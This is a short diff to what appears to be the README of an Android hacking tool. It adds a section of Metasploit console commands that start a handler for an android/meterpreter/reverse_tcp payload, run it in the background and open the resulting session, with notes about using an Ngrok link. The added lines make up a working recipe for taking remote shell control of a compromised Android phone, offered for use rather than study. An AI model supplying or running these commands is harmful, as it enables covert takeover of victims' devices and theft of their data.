@@ -49,4 +49,12 @@ bash install.sh
 ```
 Note: Use Mobile Data For Ngrok Link
 
+##2nd Command 
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST
+set LPORT
+exploit -j
+sessions -i 1
+
 ## Give me the credits if you copy ANY part from this code. Don't be NOOB!!
